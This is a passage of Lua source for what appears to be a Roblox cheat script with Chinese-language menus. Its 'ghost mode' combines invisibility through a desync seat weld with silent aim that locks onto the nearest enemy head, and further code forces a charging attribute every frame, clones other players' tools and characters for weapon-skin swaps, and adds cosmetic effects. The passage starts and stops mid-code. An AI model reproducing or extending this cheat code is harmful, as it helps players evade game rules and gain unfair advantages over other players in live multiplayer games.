    title.Font = Enum.Font.GothamBold
    title.TextSize = 11
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.Active = true

    local status = Instance.new("TextLabel", frame)
    status.Name = "StatusLabel"
    status.Size = UDim2.new(1, -10, 0, 14)
    status.Position = UDim2.new(0, 5, 0, 20)
    status.BackgroundTransparency = 1
    status.Text = ghostMode and "隐身运行中" or "面板就绪"
    status.TextColor3 = ghostMode and Color3.fromRGB(150, 255, 150) or Color3.fromRGB(255, 255, 150)
    status.Font = Enum.Font.Gotham
    status.TextSize = 9
    status.TextXAlignment = Enum.TextXAlignment.Left

    local toggleBtn = Instance.new("TextButton", frame)
    toggleBtn.Name = "ToggleBtn"
    toggleBtn.Size = UDim2.new(1, -20, 0, 22)
    toggleBtn.Position = UDim2.new(0, 10, 0, 36)
    toggleBtn.Text = ghostMode and "👻 隐身：开启" or "👻 隐身：关闭"
    toggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    toggleBtn.BackgroundColor3 = ghostMode and Color3.fromRGB(20, 120, 20) or Color3.fromRGB(80, 20, 20)
    toggleBtn.Font = Enum.Font.GothamBold
    toggleBtn.TextSize = 10
    toggleBtn.BorderSizePixel = 0
    toggleBtn.AutoButtonColor = true
    local btnCorner = Instance.new("UICorner")
    btnCorner.CornerRadius = UDim.new(0, 5)
    btnCorner.Parent = toggleBtn
    toggleBtn.MouseButton1Click:Connect(function()
        local newState = not ghostMode
        toggleGhostMode(newState)
    end)

    -- 拖动支持
    local dragging = false
    local dragStart = nil
    local startPos = nil
    frame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = frame.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)
    frame.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            if dragging and dragStart and startPos then
                local delta = input.Position - dragStart
                frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
            end
        end
    end)

    ghostExtraUI = {
        Gui = gui,
        StatusLabel = status,
        ToggleBtn = toggleBtn
    }
end

local function destroyGhostExtraUI()
    if ghostExtraUI then
        ghostExtraUI.Gui:Destroy()
        ghostExtraUI = nil
    end
end
-- ============================================
-- 幽灵模式（隐身+静默瞄准）
-- ============================================
local ghostMode = false
local ghostTarget = nil
local ghostTargetUpdateTime = 0
local ghostBotCache = {}
local ghostLastCacheUpdate = 0
local ghostUpdateConn = nil
local invisSeat = nil
local invisWeld = nil
local desyncActive = false

local function getRoot(c) return c:FindFirstChild("HumanoidRootPart") or c:FindFirstChild("Torso") or c:FindFirstChild("UpperTorso") end
local function getTorso(c) return c:FindFirstChild("Torso") or c:FindFirstChild("UpperTorso") end
local function setTrans(c, t)
    for _, p in pairs(c:GetDescendants()) do
        if p:IsA("BasePart") or p:IsA("Decal") then
            pcall(function() p.Transparency = t end)
        end
    end
end

local function enableDesync()
    if desyncActive then return end
    local c = localPlayer.Character
    if not c then return end
    local r = getRoot(c)
    local t = getTorso(c)
    if not r or not t then return end

    -- 使用task.spawn避免阻塞
    task.spawn(function()
        pcall(function() c:MoveTo(r.Position) end)
    end)

    if invisSeat then 
        pcall(function() invisSeat:Destroy() end)
        invisSeat = nil
    end

    invisSeat = Instance.new("Seat")
    invisSeat.Anchored = false
    invisSeat.CanCollide = false
    invisSeat.Transparency = 1
    invisSeat.Size = Vector3.new(2, 1, 1)
    invisSeat.CFrame = r.CFrame * CFrame.new(0, -2, 0)
    invisSeat.Parent = Workspace

    invisWeld = Instance.new("Weld")
    invisWeld.Part0 = invisSeat
    invisWeld.Part1 = t
    invisWeld.Parent = invisSeat

    task.delay(0.1, function()
        pcall(function() setTrans(c, 0.7) end)
    end)

    desyncActive = true
end

local function disableDesync()
    if invisSeat then 
        pcall(function() invisSeat:Destroy() end)
        invisSeat = nil
        invisWeld = nil 
    end

    -- 尝试恢复当前character和之前保存的character
    local c = localPlayer.Character
    if c then 
        pcall(function() setTrans(c, 0) end)
    end

    desyncActive = false
end

local function updateGhostBotCache()
    ghostBotCache = {}
    for _, v in ipairs(Workspace:GetDescendants()) do
        if v:IsA("Model") and v:FindFirstChildOfClass("Humanoid") and v:FindFirstChild("Head") then
            if not Players:GetPlayerFromCharacter(v) then
                local hum = v:FindFirstChildOfClass("Humanoid")
                local head = v:FindFirstChild("Head")
                if hum and hum.Health > 0 and head then
                    table.insert(ghostBotCache, head)
                end
            end
        end
    end
end

local function updateGhostTarget()
    if not ghostMode then return end
    local cam = Camera
    if not cam then return end
    local now = os.clock()
    if ghostTarget and now - ghostTargetUpdateTime < 0.15 and ghostTarget.Parent then
        local h = ghostTarget.Parent:FindFirstChildOfClass("Humanoid")
        if h and h.Health > 0 then return end
    end
    if now - ghostLastCacheUpdate > 3 then updateGhostBotCache(); ghostLastCacheUpdate = now end

    local best, bestDist = nil, math.huge
    local camPos = cam.CFrame.Position

    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= localPlayer and p.Team ~= localPlayer.Team and p.Character then
            local head = p.Character:FindFirstChild("Head")
            if head and p.Character:FindFirstChildOfClass("Humanoid") and p.Character:FindFirstChildOfClass("Humanoid").Health > 0 then
                local d = (camPos - head.Position).Magnitude
                if d < bestDist then bestDist = d; best = head end
            end
        end
    end

    for _, head in ipairs(ghostBotCache) do
        if head.Parent then
            local d = (camPos - head.Position).Magnitude
            if d < bestDist then bestDist = d; best = head end
        end
    end

    if best then ghostTarget = best; ghostTargetUpdateTime = now end
end

function toggleGhostMode(state)
    -- 强制重置状态，避免状态不同步
    if state == nil then state = not ghostMode end

    if state == ghostMode then 
        -- 如果状态相同但desync不活跃，强制重新启用
        if state and not desyncActive then
            -- 继续执行开启逻辑
        else
            return 
        end
    end

    ghostMode = state
    if ghostMode then
        enableDesync()
        installPrecisionSilent()
        if not ghostUpdateConn then
            ghostUpdateConn = RunService.Heartbeat:Connect(updateGhostTarget)
        end
        _G.NEX_LC_VARS.desyncEnabled = true
        WindUI:Notify({ Title = "幽灵模式", Content = "已开启（隐身+静默瞄准）", Duration = 2 })
    else
        if ghostUpdateConn then
            ghostUpdateConn:Disconnect()
            ghostUpdateConn = nil
        end
        ghostTarget = nil
        disableDesync()
        _G.NEX_LC_VARS.desyncEnabled = false
        WindUI:Notify({ Title = "幽灵模式", Content = "已关闭", Duration = 2 })
    end

    -- 安全更新UI
    pcall(function()
        if ghostExtraUI and ghostExtraUI.ToggleBtn then
            ghostExtraUI.ToggleBtn.Text = ghostMode and "👻 隐身：开启" or "👻 隐身：关闭"
            ghostExtraUI.ToggleBtn.BackgroundColor3 = ghostMode and Color3.fromRGB(20, 120, 20) or Color3.fromRGB(80, 20, 20)
        end
    end)
    pcall(function()
        if ghostExtraUI and ghostExtraUI.StatusLabel then
            ghostExtraUI.StatusLabel.Text = ghostMode and "隐身运行中" or "面板就绪"
            ghostExtraUI.StatusLabel.TextColor3 = ghostMode and Color3.fromRGB(150, 255, 150) or Color3.fromRGB(255, 255, 150)
        end
    end)
end

-- 角色重生时自动恢复透明度
localPlayer.CharacterAdded:Connect(function(char)
    if not ghostMode then
        task.delay(0.5, function()
            pcall(function() setTrans(char, 0) end)
        end)
    else
        -- 如果幽灵模式还开着，重新应用隐身
        task.delay(0.5, function()
            if ghostMode then
                pcall(function() setTrans(char, 0.7) end)
                -- 重新创建invisSeat
                local r = char:WaitForChild("HumanoidRootPart", 2)
                local t = char:FindFirstChild("Torso") or char:FindFirstChild("UpperTorso")
                if r and t and not invisSeat then
                    invisSeat = Instance.new("Seat")
                    invisSeat.Anchored = false
                    invisSeat.CanCollide = false
                    invisSeat.Transparency = 1
                    invisSeat.Size = Vector3.new(2, 1, 1)
                    invisSeat.CFrame = r.CFrame * CFrame.new(0, -2, 0)
                    invisSeat.Parent = Workspace
                    invisWeld = Instance.new("Weld")
                    invisWeld.Part0 = invisSeat
                    invisWeld.Part1 = t
                    invisWeld.Parent = invisSeat
                end
            end
        end)
    end
end)



function toggleDesyncUI(show)
    if show then
        if not _G.NEX_LC_VARS.desyncUI then
            local gui = Instance.new("ScreenGui", CoreGui)
            gui.Name = "DesyncStandalone"
            gui.ResetOnSpawn = false
            local frame = Instance.new("Frame", gui)
            frame.Size = UDim2.new(0, 160, 0, 60)
            frame.Position = UDim2.new(0, 10, 0.4, 0)
            frame.BackgroundColor3 = Color3.fromRGB(10, 10, 15)
            frame.BorderSizePixel = 0
            frame.Draggable = true
            frame.Active = true
            Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 8)
            local title = Instance.new("TextLabel", frame)
            title.Size = UDim2.new(1, 0, 0, 22)
            title.Text = "👻 幽灵模式"
            title.TextColor3 = Color3.fromRGB(200, 150, 255)
            title.BackgroundTransparency = 1
            title.Font = Enum.Font.GothamBold
            title.TextSize = 12
            local toggle = Instance.new("TextButton", frame)
            toggle.Size = UDim2.new(1, -20, 0, 28)
            toggle.Position = UDim2.new(0, 10, 0, 26)
            toggle.Text = ghostMode and "关闭" or "开启"
            toggle.BackgroundColor3 = ghostMode and Color3.fromRGB(20, 60, 20) or Color3.fromRGB(60, 20, 20)
            toggle.TextColor3 = Color3.fromRGB(255, 255, 255)
            toggle.Font = Enum.Font.GothamBold
            toggle.TextSize = 12
            toggle.BorderSizePixel = 0
            Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 5)
            toggle.MouseButton1Click:Connect(function()
                toggleGhostMode(not ghostMode)
            end)
            gui.Frame = frame
            gui.ToggleButton = toggle
            _G.NEX_LC_VARS.desyncUI = gui
        else
            _G.NEX_LC_VARS.desyncUI.Enabled = true
        end
    else
        if _G.NEX_LC_VARS.desyncUI then
            _G.NEX_LC_VARS.desyncUI:Destroy()
            _G.NEX_LC_VARS.desyncUI = nil
        end
    end
end

_G.NEX_LC_VARS.autoChargeEnabled = false
_G.NEX_LC_VARS.autoChargeConn = nil
_G.NEX_LC_VARS.autoChargeWindUIToggle = nil
_G.NEX_LC_VARS.autoChargeGui = nil

function doAutoCharge()
    if not _G.NEX_LC_VARS.autoChargeEnabled then return end
    local char = localPlayer.Character
    if not char then return end
    pcall(function()
        char:SetAttribute("isCharging", true)
    end)
end

function updateAutoCharge()
    if _G.NEX_LC_VARS.autoChargeEnabled then
        if not _G.NEX_LC_VARS.autoChargeConn then
            _G.NEX_LC_VARS.autoChargeConn = RunService.Heartbeat:Connect(doAutoCharge)
        end
    else
        if _G.NEX_LC_VARS.autoChargeConn then
            _G.NEX_LC_VARS.autoChargeConn:Disconnect()
            _G.NEX_LC_VARS.autoChargeConn = nil
        end
        local char = localPlayer.Character
        if char then
            pcall(function() char:SetAttribute("isCharging", false) end)
        end
    end
end

_G.NEX_LC_VARS.zombieEnabled = false
local zombieOriginalProps = {}
local zombieParticles = {}
local zombieFog = nil

function applyZombie()
    local char = localPlayer.Character
    if not char then return end
    for _, part in pairs(char:GetDescendants()) do
        if part:IsA("BasePart") and (part.Name:lower():find("head") or part.Name:lower():find("arm")) then
            if not zombieOriginalProps[part] then
                zombieOriginalProps[part] = {Material = part.Material, Color = part.Color, Transparency = part.Transparency}
            end
            part.Material = Enum.Material.Slate
            part.Color = Color3.fromRGB(80,100,50)
            part.Transparency = 0.1
        end
    end
    for _, part in pairs(char:GetDescendants()) do
        if part:IsA("BasePart") then
            local emitter = Instance.new("ParticleEmitter")
            emitter.Texture = "rbxasset://textures/particles/sparkles_main.dds"
            emitter.Color = ColorSequence.new(Color3.fromRGB(70,120,40))
            emitter.Size = NumberSequence.new(0.2,0.5)
            emitter.Transparency = NumberSequence.new(0.6,1)
            emitter.SpreadAngle = Vector2.new(360,360)
            emitter.Lifetime = NumberRange.new(0.8,1.5)
            emitter.Rate = 15
            emitter.Speed = NumberRange.new(0.2,1)
            emitter.Acceleration = Vector3.new(0,1,0)
            emitter.Parent = part
            table.insert(zombieParticles, emitter)
        end
    end
    local root = char:FindFirstChild("HumanoidRootPart")
    if root then
        local att = Instance.new("Attachment")
        att.CFrame = CFrame.new(0, -1.2, 0)
        att.Parent = root
        local fog = Instance.new("ParticleEmitter")
        fog.Texture = "rbxasset://textures/particles/smoke_main.dds"
        fog.Color = ColorSequence.new(Color3.fromRGB(90,150,70), Color3.fromRGB(160,210,80))
        fog.Size = NumberSequence.new(2.5,4.5)
        fog.Transparency = NumberSequence.new(0.4,1)
        fog.Lifetime = NumberRange.new(1.8,2.5)
        fog.Rate = 30
        fog.SpreadAngle = Vector2.new(360,360)
        fog.Speed = NumberRange.new(0.6,1.4)
        fog.RotSpeed = NumberRange.new(-20,20)
        fog.LightEmission = 0.2
        fog.Parent = att
        zombieFog = {att = att, fog = fog}
    end
end

function removeZombie()
    local char = localPlayer.Character
    if char then
        for part, props in pairs(zombieOriginalProps) do
            if part and part.Parent then
                part.Material = props.Material
                part.Color = props.Color
                part.Transparency = props.Transparency
            end
        end
        zombieOriginalProps = {}
        for _, em in ipairs(zombieParticles) do em:Destroy() end
        zombieParticles = {}
        if zombieFog then
            zombieFog.att:Destroy()
            zombieFog = nil
        end
    end
end

function toggleZombie(state)
    _G.NEX_LC_VARS.zombieEnabled = state
    if state then
        if localPlayer.Character then applyZombie() end
        localPlayer.CharacterAdded:Connect(function(char)
            if _G.NEX_LC_VARS.zombieEnabled then applyZombie() end
        end)
    else
        removeZombie()
    end
end

_G.NEX_LC_VARS.envStormEnabled = false
local stormActive = false
local stormFolder = nil
local seaPlane = nil

function resetLighting()
    Lighting.ClockTime = 14
    Lighting.Brightness = 2
    Lighting.Ambient = Color3.fromRGB(127,127,127)
    Lighting.OutdoorAmbient = Color3.fromRGB(127,127,127)
    local sky = Lighting:FindFirstChildOfClass("Sky")
    if sky then sky:Destroy() end
    local atmo = Lighting:FindFirstChildOfClass("Atmosphere")
    if atmo then atmo:Destroy() end
end

function applyStorm()
    resetLighting()
    local sky = Instance.new("Sky")
    sky.SkyboxBk = "rbxassetid://13540026264"
    sky.SkyboxDn = "rbxassetid://13540026264"
    sky.SkyboxFt = "rbxassetid://13540026264"
    sky.SkyboxLf = "rbxassetid://13540026264"
    sky.SkyboxRt = "rbxassetid://13540026264"
    sky.SkyboxUp = "rbxassetid://13540026264"
    sky.CelestialBodiesShown = false
    sky.Parent = Lighting
    Lighting.ClockTime = 0
    Lighting.Brightness = 0.1
    Lighting.Ambient = Color3.fromRGB(12,16,30)
    Lighting.OutdoorAmbient = Color3.fromRGB(140,160,195)
    local atmo = Instance.new("Atmosphere")
    atmo.Density = 0.42
    atmo.Haze = 3.6
    atmo.Color = Color3.fromRGB(140,160,195)
    atmo.Decay = Color3.fromRGB(12,16,30)
    atmo.Glare = 0.6
    atmo.Parent = Lighting
    local seaCont = Instance.new("Folder")
    seaCont.Name = "Env_Sea"
    seaCont.Parent = Workspace
    local sea = Instance.new("Part")
    sea.Name = "ReflectiveSea"
    sea.Size = Vector3.new(12000,1,12000)
    sea.Position = Vector3.new(0,-3,0)
    sea.Anchored = true
    sea.CanCollide = false
    sea.Material = Enum.Material.Glass
    sea.Color = Color3.fromRGB(15,20,32)
    sea.Transparency = 0.15
    sea.Parent = seaCont
    seaPlane = sea
    stormFolder = Instance.new("Folder")
    stormFolder.Name = "Env_Snow"
    stormFolder.Parent = Workspace
    for i = 1, 800 do
        local snow = Instance.new("Part")
        snow.Shape = Enum.PartType.Ball
        local size = math.random(6,16)/100
        snow.Size = Vector3.new(size,size,size)
        snow.Color = Color3.fromRGB(140,160,195)
        snow.Material = Enum.Material.Neon
        snow.CanCollide = false
        snow.Anchored = true
        snow.Transparency = 1
        snow.Position = Vector3.new(0,9999,0)
        snow.Parent = stormFolder
    end
    stormActive = true
    task.spawn(function()
        while stormActive do
            local root = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
            if root then
                for _, snow in ipairs(stormFolder:GetChildren()) do
                    if snow:IsA("Part") then
                        local r = 65
                        local start = root.Position + Vector3.new(math.random(-r*10,r*10)/10 - 22.5, math.random(40,110), math.random(-r*10,r*10)/10 + 10)
                        local duration = math.random(11,20)/10
                        local target = start + Vector3.new(-45 + math.random(-80,80)/10, -125, 20 + math.random(-80,80)/10)
                        snow.Position = start
                        snow.Transparency = 0.08
                        TweenService:Create(snow, TweenInfo.new(duration, Enum.EasingStyle.Linear), {Position = target}):Play()
                        task.wait(0.015)
                    end
                end
            end
            task.wait(0.015)
        end
    end)
end

function removeStorm()
    stormActive = false
    resetLighting()
    if stormFolder then stormFolder:Destroy(); stormFolder = nil end
    if seaPlane then seaPlane.Parent:Destroy(); seaPlane = nil end
    local seaCont = Workspace:FindFirstChild("Env_Sea")
    if seaCont then seaCont:Destroy() end
    local snowLayer = Workspace:FindFirstChild("Env_Snow")
    if snowLayer then snowLayer:Destroy() end
end

function toggleStorm(state)
    _G.NEX_LC_VARS.envStormEnabled = state
    if state then
        if not stormActive then applyStorm() end
    else
        removeStorm()
    end
end

currentAnimTrack = nil
loopAnimTrack = nil
currentAnimId = nil
loopAnimId = nil

local ZGR_STAND_ID = "119685611734775"
local ZGR_WALK_ID = "74863428418618"
_G.NEX_LC_VARS.zgrActive = false
_G.NEX_LC_VARS.zgrConn = nil
_G.NEX_LC_VARS.zgrCurrentAnim = nil
_G.NEX_LC_VARS.zgrCurrentAnimId = nil

function updateZGRAnim()
    if not _G.NEX_LC_VARS.zgrActive then return end
    local char = localPlayer.Character
    if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not hum then return end
    local animator = hum:FindFirstChildOfClass("Animator")
    if not animator then
        animator = Instance.new("Animator")
        animator.Parent = hum
    end
    local isMoving = hum.MoveDirection.Magnitude > 0.1
    local targetId = isMoving and ZGR_WALK_ID or ZGR_STAND_ID
    if _G.NEX_LC_VARS.zgrCurrentAnimId ~= targetId then
        if _G.NEX_LC_VARS.zgrCurrentAnim then
            _G.NEX_LC_VARS.zgrCurrentAnim:Stop()
        end
        local anim = Instance.new("Animation")
        anim.AnimationId = "rbxassetid://" .. targetId
        local track = animator:LoadAnimation(anim)
        if track then
            track.Looped = true
            track:Play()
            _G.NEX_LC_VARS.zgrCurrentAnim = track
            _G.NEX_LC_VARS.zgrCurrentAnimId = targetId
        end
    end
end

function startZGR()
    _G.NEX_LC_VARS.zgrActive = true
    if not _G.NEX_LC_VARS.zgrConn then
        _G.NEX_LC_VARS.zgrConn = RunService.Heartbeat:Connect(updateZGRAnim)
    end
    updateZGRAnim()
end

function stopZGR()
    _G.NEX_LC_VARS.zgrActive = false
    if _G.NEX_LC_VARS.zgrConn then
        _G.NEX_LC_VARS.zgrConn:Disconnect()
        _G.NEX_LC_VARS.zgrConn = nil
    end
    if _G.NEX_LC_VARS.zgrCurrentAnim then
        _G.NEX_LC_VARS.zgrCurrentAnim:Stop()
        _G.NEX_LC_VARS.zgrCurrentAnim = nil
        _G.NEX_LC_VARS.zgrCurrentAnimId = nil
    end
end

normalAnims = {
    {"拉旗", "rbxassetid://91746564111760"},
    {"动画2", "rbxassetid://136861300473290"},
    {"动画3", "rbxassetid://124217719070139"},
    {"祖国人", "rbxassetid://119685611734775"},
    {"动画5", "rbxassetid://81794301390231"},
    {"哈灵顿", "rbxassetid://98447078830933"},
    {"爬", "rbxassetid://90523023529019"},
    {"新动画1", "rbxassetid://108356970997816"},
    {"新动画2", "rbxassetid://113234044135357"},
    {"新动画3", "rbxassetid://111854144155425"},
    {"新动画4", "rbxassetid://121223982983643"},
}

loopAnims = {
    {"循环1", "rbxassetid://132558953313877"},
    {"循环2", "rbxassetid://110291939494709"},
}

function getAnimator()
    local char = localPlayer.Character
    if not char then return nil end
    local hum = char:FindFirstChild("Humanoid")
    if not hum then return nil end
    local animator = hum:FindFirstChildOfClass("Animator")
    if not animator then
        animator = Instance.new("Animator")
        animator.Parent = hum
    end
    return animator
end

function playNormalAnim(id)
    local animator = getAnimator()
    if not animator then return end
    if currentAnimTrack then currentAnimTrack:Stop() end
    local anim = Instance.new("Animation")
    anim.AnimationId = id
    currentAnimTrack = animator:LoadAnimation(anim)
    if currentAnimTrack then currentAnimTrack:Play() end
    currentAnimId = id
end

function startLoopAnim(id)
    local animator = getAnimator()
    if not animator then return end
    if loopAnimTrack then loopAnimTrack:Stop() end
    if currentAnimTrack then currentAnimTrack:Stop() end
    local anim = Instance.new("Animation")
    anim.AnimationId = id
    loopAnimTrack = animator:LoadAnimation(anim)
    if loopAnimTrack then
        loopAnimTrack.Looped = true
        loopAnimTrack:Play()
        loopAnimId = id
    end
end

function stopLoopAnim()
    if loopAnimTrack then loopAnimTrack:Stop(); loopAnimTrack = nil end
    loopAnimId = nil
end

function stopAllAnims()
    if currentAnimTrack then currentAnimTrack:Stop(); currentAnimTrack = nil end
    stopLoopAnim()
    if _G.NEX_LC_VARS.zgrActive then stopZGR() end
    currentAnimId = nil
end

_G.MeshIdPresets = _G.MeshIdPresets or {}

local function insertBuiltInMesh(name, meshId, textureId, defaultScale)
    if _G.MeshIdPresets[name] then return end
    local mModel = Instance.new("Model")
    mModel.Name = name
    Instance.new("BoolValue", mModel).Name = "IsClonedVisual"
    local scaleTag = Instance.new("NumberValue", mModel)
    scaleTag.Name = "DefaultScaleTag"
    scaleTag.Value = defaultScale or 1
    local p = Instance.new("Part")
    p.Name = "HumanoidRootPart"
    p.Size = Vector3.new(1,1,1)
    p.Parent = mModel
    mModel.PrimaryPart = p
    local sm = Instance.new("SpecialMesh")
    sm.MeshId = meshId
    sm.TextureId = textureId
    sm.Scale = Vector3.new(defaultScale, defaultScale, defaultScale)
    sm.Parent = p
    _G.MeshIdPresets[name] = mModel
end

insertBuiltInMesh("预设：AWM", "rbxassetid://4711574250", "rbxassetid://4711574306", 0.4)
insertBuiltInMesh("预设：knife", "rbxassetid://3526876559", "rbxassetid://3526876643", 0.4)
insertBuiltInMesh("预设：miku", "rbxassetid://725780229", "rbxassetid://725780236", 0.5)
insertBuiltInMesh("预设：砖头", "rbxassetid://9865485131", "rbxassetid://9865485198", 0.3)

useLightsaber = false
pickupPlayer = false
sourceWeapon = "军刀"
selectedMeshPreset = nil

_G.LocalPresets = {}
_G.CapturedTools = {}

local function createLocalPreset(name, config)
    local mockModel = Instance.new("Model")
    mockModel.Name = name
    Instance.new("BoolValue", mockModel).Name = "IsClonedVisual"
    local mainPart = Instance.new("Part")
    mainPart.Name = "HumanoidRootPart"
    mainPart.Size = config.HandleSize
    mainPart.Color = config.HandleColor
    mainPart.CanCollide = false
    mainPart.Anchored = false
    mainPart.Massless = true
    mainPart.Parent = mockModel
    mockModel.PrimaryPart = mainPart
    local blade = Instance.new("Part")
    blade.Name = "BladePart"
    blade.Size = config.BladeSize
    blade.Color = config.BladeColor
    blade.Material = config.BladeMaterial
    blade.CanCollide = false
    blade.Anchored = false
    blade.Massless = true
    blade.CFrame = mainPart.CFrame * CFrame.new(0, 3, 0)
    blade.Parent = mockModel
    local w = Instance.new("WeldConstraint")
    w.Part0 = mainPart
    w.Part1 = blade
    w.Parent = mainPart
    _G.LocalPresets[name] = mockModel
end

createLocalPreset("本地：赛博极光剑", {
    HandleSize = Vector3.new(0.3,1.2,0.3),
    HandleColor = Color3.fromRGB(30,30,30),
    BladeSize = Vector3.new(0.15,6.5,0.5),
    BladeColor = Color3.fromRGB(0,255,120),
    BladeMaterial = Enum.Material.Neon
})
createLocalPreset("本地：虚空惩戒大剑", {
    HandleSize = Vector3.new(0.5,1.5,0.5),
    HandleColor = Color3.fromRGB(50,0,50),
    BladeSize = Vector3.new(0.3,8.0,1.5),
    BladeColor = Color3.fromRGB(200,0,255),
    BladeMaterial = Enum.Material.Neon
})
createLocalPreset("本地黄金双手剑", {
    HandleSize = Vector3.new(0.4,1.4,0.4),
    HandleColor = Color3.fromRGB(120,90,20),
    BladeSize = Vector3.new(0.25,7.0,1.2),
    BladeColor = Color3.fromRGB(255,200,0),
    BladeMaterial = Enum.Material.Glass
})

local function checkAndCapture(child, toolName)
    if not child or not toolName or child:FindFirstChild("IsClonedVisual") or child:FindFirstChild("IsClonedHumanVisual") then return end
    if Players:GetPlayerFromCharacter(child) or child.Parent == localPlayer.Character or child:IsDescendantOf(localPlayer.Character) then return end
    pcall(function()
        if child:IsA("Model") or child:IsA("MeshPart") or child:IsA("BasePart") then
            local weaponName = string.lower(toolName)
            if not _G.CapturedTools[weaponName] then
                local backup = child:Clone()
                Instance.new("BoolValue", backup).Name = "IsClonedVisual"
                for _, p in ipairs(backup:GetDescendants()) do
                    if p:IsA("Humanoid") or p:IsA("Animate") or p.Name == "Health" or p.Name == "HumanoidRootPart" then
                        p:Destroy()
                    elseif p:IsA("BasePart") then
                        p.CanCollide = false
                        p.Anchored = false
                        p.Massless = true
                    end
                end
                _G.CapturedTools[weaponName] = backup
            end
        end
    end)
end

local function scanCharacter(character)
    if not character or character == localPlayer.Character then return end
    character.ChildAdded:Connect(function(child)
        task.wait(0.05)
        if child:IsA("Tool") then
            for _, obj in ipairs(child:GetChildren()) do
                checkAndCapture(obj, child.Name)
            end
            child.ChildAdded:Connect(function(obj)
                checkAndCapture(obj, child.Name)
            end)
        end
    end)
end

for _, p in ipairs(Players:GetPlayers()) do
    if p.Character then scanCharacter(p.Character) end
    p.CharacterAdded:Connect(scanCharacter)
end
Players.PlayerAdded:Connect(function(p)
    p.CharacterAdded:Connect(scanCharacter)
end)

local activeClonedModel = nil
local rotX, rotY, rotZ = 0, 0, 0
local meshScale = 1

local function updateLocalRotation()
    if activeClonedModel and activeClonedModel.Parent then
        pcall(function()
            local newPrimary = activeClonedModel:FindFirstChild("HumanoidRootPart") or activeClonedModel.PrimaryPart or activeClonedModel:FindFirstChildOfClass("BasePart")
            local basePart = activeClonedModel.Parent:IsA("BasePart") and activeClonedModel.Parent or activeClonedModel.Parent:FindFirstChild("Handle") or activeClonedModel.Parent:FindFirstChildOfClass("BasePart")
            if newPrimary and basePart then
                local oldWeld = basePart:FindFirstChild("UltimateSwapperWeld")
                if oldWeld then oldWeld:Destroy() end
                newPrimary.CFrame = basePart.CFrame * CFrame.Angles(math.rad(rotX), math.rad(rotY), math.rad(rotZ))
                -- 应用缩放
                for _, sm in ipairs(activeClonedModel:GetDescendants()) do
                    if sm:IsA("SpecialMesh") then
                        local baseScale = sm:GetAttribute("BaseScale") or Vector3.new(1,1,1)
                        sm.Scale = baseScale * meshScale
                    elseif sm:IsA("MeshPart") then
                        local baseSize = sm:GetAttribute("BaseSize") or sm.Size
                        pcall(function() sm.Size = baseSize * meshScale end)
                    elseif sm:IsA("BasePart") and not sm:IsA("MeshPart") then
                        local baseSize = sm:GetAttribute("BaseSize") or sm.Size
                        sm.Size = baseSize * meshScale
                    end
                end
                local weld = Instance.new("WeldConstraint")
                weld.Name = "UltimateSwapperWeld"
                weld.Part0 = basePart
                weld.Part1 = newPrimary
                weld.Parent = basePart
            end
        end)
    end
end

local function handleCoreSwap(child)
    if activeClonedModel and activeClonedModel.Parent then
        pcall(function() activeClonedModel:Destroy() end)
        activeClonedModel = nil
    end

    task.wait(0.02)
    local char = localPlayer.Character
    if not char or child == char then return end
    local currentTool = char:FindFirstChildOfClass("Tool")
    if currentTool and string.find(string.lower(currentTool.Name), string.lower(sourceWeapon)) then
        if child:IsA("Model") or child:IsA("MeshPart") or child:IsA("BasePart") then
            if child:FindFirstChild("IsClonedVisual") or child:FindFirstChild("IsClonedHumanVisual") then return end

            for _, part in ipairs(child:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.LocalTransparencyModifier = 1
                    part:GetPropertyChangedSignal("LocalTransparencyModifier"):Connect(function()
                        part.LocalTransparencyModifier = 1
                    end)
                end
            end
            if child:IsA("BasePart") then child.LocalTransparencyModifier = 1 end

            local targetPart = child:IsA("BasePart") and child or child:FindFirstChild("Handle") or child:FindFirstChildOfClass("BasePart")
            if not targetPart then return end

            local clonedTemplate = nil

            if selectedMeshPreset and _G.MeshIdPresets[selectedMeshPreset] then
                clonedTemplate = _G.MeshIdPresets[selectedMeshPreset]:Clone()
                local tag = _G.MeshIdPresets[selectedMeshPreset]:FindFirstChild("DefaultScaleTag")
                if tag then 
                    meshScale = tag.Value 
                else
                    meshScale = 1
                end
            elseif useLightsaber then
                local template = _G.LocalPresets["本地：赛博极光剑"]
                if template then 
                    clonedTemplate = template:Clone() 
                    meshScale = 1
                end
            elseif pickupPlayer then
                meshScale = 1
                local candidates = {}
                for _, plr in ipairs(Players:GetPlayers()) do
                    if plr ~= localPlayer and isTeammate(plr) and plr.Character then
                        table.insert(candidates, plr)
                    end
                end
                if #candidates > 0 then
                    local targetPlayer = candidates[math.random(1, #candidates)]
                    if targetPlayer and targetPlayer.Character then
                        pcall(function()
                            targetPlayer.Character.Archivable = true
                            clonedTemplate = targetPlayer.Character:Clone()
                            Instance.new("BoolValue", clonedTemplate).Name = "IsClonedHumanVisual"
                            for _, sub in ipairs(clonedTemplate:GetDescendants()) do
                                if sub:IsA("BasePart") then
                                    sub.CanCollide = false
                                    sub.Anchored = false
                                    sub.Massless = true
                                end
                                if sub:IsA("Script") or sub:IsA("LocalScript") then
                                    sub:Destroy()
                                end
                            end
                            local hum = clonedTemplate:FindFirstChildOfClass("Humanoid")
                            if hum then hum.PlatformStand = true end
                        end)
                    end
                end
            end

            if clonedTemplate then
                -- 为所有部件设置基础缩放属性，供 updateLocalRotation 使用
                for _, part in ipairs(clonedTemplate:GetDescendants()) do
                    if part:IsA("SpecialMesh") and not part:GetAttribute("BaseScale") then
                        part:SetAttribute("BaseScale", part.Scale)
                    elseif part:IsA("BasePart") and not part:GetAttribute("BaseSize") then
